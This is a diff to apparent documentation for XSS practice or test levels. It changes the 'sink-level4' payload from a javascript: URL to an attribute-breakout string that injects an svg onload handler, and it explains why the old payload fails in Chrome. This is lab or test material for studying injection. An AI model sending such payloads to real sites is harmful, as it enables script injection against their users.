@@ -25,10 +25,10 @@ Reflections into a variety of URL-like or DOM sinks (href, location, action, emb
 
 ### sink-level4
 
-`/sink/level4/?query=javascript:alert(1)`
+`/sink/level4/?query=x%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: `<embed src="...">`; legacy embed loads JS URL
+- payload: `x"><svg onload=alert(1)>`
+- context: `<embed src="...">`; Chrome blocks javascript: src, so break out
 
 ### sink-level5
 
